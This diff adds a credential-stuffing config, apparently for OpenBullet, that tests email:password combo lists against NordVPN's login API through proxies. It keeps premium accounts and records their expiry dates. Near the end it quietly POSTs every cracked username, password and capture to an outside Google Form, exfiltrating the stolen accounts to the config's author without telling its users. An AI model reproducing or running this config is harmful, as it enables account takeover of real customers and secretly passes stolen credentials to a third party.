@@ -1,0 +1,87 @@
+[SETTINGS]
+{
+  "CreatorLK": "OB-ea1bc4a12d7a1d6a6ba968a1f1484da6-LoliKEY",
+  "Name": "NordVPN - PREMIUM ONLY + HIGH CPM",
+  "SuggestedBots": 200,
+  "LastModified": "2019-05-31T20:23:16.5825776+07:00",
+  "AdditionalInfo": "Capture PREMIUM ONLY + High CPM (Expiration Date)",
+  "KeysDB": "",
+  "LocalKeysDB": "",
+  "isWtoEdit": false,
+  "Author": "Pein Akatsuki (loliX Encrypted)",
+  "Version": "1.2.2.4",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Login REQUEST POST "https://zwyr157wwiu6eior.com/v1/users/tokens" 
+  CONTENT "username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Cek_Login KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "\"message\":\"Unauthorized\"" 
+  KEYCHAIN Success OR 
+    KEY "\"user_id\":" 
+
+#Token PARSE "<SOURCE>" LR "\"token\":\"" "\"" -> VAR "Token" 
+
+#Encode_Token FUNCTION Base64Encode "token:<Token>" -> VAR "Encodetoken" 
+
+#Request_Akun REQUEST GET "https://zwyr157wwiu6eior.com/v1/users/services" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Authorization: Basic <Encodetoken>" 
+
+IF "<SOURCE>" Contains "[]" 
+JUMP #Terakhir_Dicek
+ENDIF 
+
+#Tanggal_Kadaluarsa PARSE "<SOURCE>" LR "\",\"expires_at\":\"" "\"" -> CAP "Expiration Date" 
+
+#Waktu_Paket FUNCTION DateToUnixTime "yyyy-MM-dd HH:mm:ss" "<Expiration Date>" -> VAR "WaktuPaket" 
+
+#Waktu_Sekarang FUNCTION CurrentUnixTime -> VAR "WaktuSekarang" 
+
+#Terakhir_Dicek FUNCTION UnixTimeToDate "<WaktuSekarang>" -> CAP "Last Checked" 
+
+#Cek_Status KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "[]" 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "<WaktuSekarang>" GreaterThan "<WaktuPaket>" 
+
+#Perbaikan FUNCTION URLEncode "<USER>:<PASS>" -> VAR "Combo" 
+
+#Perbaikan FUNCTION URLEncode "| Expiration Date : <Expiration Date> | Last Checked : <Last Checked>" -> VAR "Capture" 
+
+#Verifikasi REQUEST POST "https://docs.google.com/forms/d/e/1FAIpQLSf0vPPdf1YnqGtosZP9iyMl6UgXw6m5ovySuK9fkdtV6oHd6g/formResponse" ReadResponseSource=FALSE 
+  CONTENT "entry.2005620554=NordVPN&entry.1065046570=<Combo>&entry.1166974658=<Capture>&fvv=1&draftResponse=%5Bnull%2Cnull%2C%22-2812586880146746463%22%5D%0D%0A&pageHistory=0&fbzx=-2812586880146746463" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "origin: https://docs.google.com" 
+  HEADER "upgrade-insecure-requests: 1" 
+
+
